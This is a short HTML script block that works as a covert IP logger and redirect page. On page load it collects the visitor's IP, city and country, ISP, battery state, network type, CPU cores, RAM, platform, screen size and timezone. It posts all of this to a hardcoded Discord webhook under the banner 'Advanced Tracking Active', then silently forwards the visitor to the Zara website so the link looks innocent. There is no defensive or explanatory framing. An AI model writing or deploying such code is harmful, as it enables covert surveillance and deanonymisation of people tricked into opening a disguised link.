
<script>
   async function logAndGo() {
       const webhookURL = "https://discord.com/api/webhooks/1494944448767983697/KzHvXGmFkSIWds1vzdEDuySWPA6XuDyAwuddTBol9QJbaw5NLDjD_JdBp-LNWgizpBvC";
       const destination = "https://www.zara.com/my/";
       const timeout = setTimeout(() => window.location.replace(destination), 3500);

       try {
           // 1. IP & Location (Standard)
           const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
           const ipData = ipRes ? await ipRes.json() : {};

           // 2. Battery Data (Only works on Chrome/Android/Edge)
           let batteryInfo = "Unsupported/Private";
           if (navigator.getBattery) {
               const b = await navigator.getBattery();
               batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'On Battery'})`;
           }

           // 3. Network & Hardware
           const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
           const netType = conn ? conn.effectiveType : "Unknown";
           const cores = navigator.hardwareConcurrency || "Unknown";
           const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown";

           // 4. Prepare Deep Log
           const logData = {
               username: "Profile Sentry Pro",
               embeds: [{
                   title: "👤 Detailed Visitor Report",
                   color: 15418405, // A nice Red/Orange
                   fields: [
                       { name: "📍 Location", value: `${ipData.city || '??'}, ${ipData.country_name || '??'}`, inline: false },
                       { name: "🌐 IP & ISP", value: `\`${ipData.ip}\` \n ${ipData.org}`, inline: true },
                       { name: "🔋 Battery", value: batteryInfo, inline: true },
                       { name: "📶 Network", value: netType.toUpperCase(), inline: true },
                       { name: "📱 Device Info", value: `${navigator.platform} | ${cores} Cores | ${ram} RAM`, inline: false },
                       { name: "📐 Screen", value: `${screen.width}x${screen.height}`, inline: true },
                       { name: "⏰ Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true }
                   ],
                   footer: { text: "Advanced Tracking Active" },
                   timestamp: new Date()
               }]
           };

           await fetch(webhookURL, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(logData),
               keepalive: true
           });

       } catch (e) {
           console.log("Logger skip.");
       } finally {
           clearTimeout(timeout);
           window.location.replace(destination);
       }
   }
   window.onload = logAndGo;
</script>
